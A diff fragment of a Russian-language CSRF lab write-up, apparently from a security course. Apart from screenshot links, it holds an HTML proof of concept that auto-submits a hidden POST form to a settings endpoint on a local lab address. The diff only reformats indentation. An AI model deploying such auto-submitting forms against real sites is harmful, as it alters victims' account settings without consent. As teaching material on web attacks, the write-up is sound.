@@ -47,20 +47,21 @@ GET-запросы не должны использоваться для вып�
 ![Иллюстрация к проекту](https://github.com/kythip/shift2019/blob/master/csrf/Снимок.PNG)
 ![Иллюстрация к проекту](https://github.com/kythip/shift2019/blob/master/csrf/Снимок1.PNG)
 ![Иллюстрация к проекту](https://github.com/kythip/shift2019/blob/master/csrf/Снимок2.PNG)
+
 ---
   <!DOCTYPE html> 
   <html lang="en"> 
   <head> 
-      <meta charset="UTF-8"> 
-      <title>CSRF</title> 
+  <meta charset="UTF-8"> 
+  <title>CSRF</title> 
   </head> 
   <body> 
  
   <br> 
   <p> 
-      <form name="csrf_try" action="http://192.168.99.100:1337/change_settings_2" method="POST"> 
-          <p><input type=hidden value="false" name=settings> 
-      </form> 
+  <form name="csrf_try" action="http://192.168.99.100:1337/change_settings_2" method="POST"> 
+  <p><input type=hidden value="false" name=settings> 
+  </form> 
   </p> 
   <script type="text/javascript"> 
   document.csrf_try.submit(); 
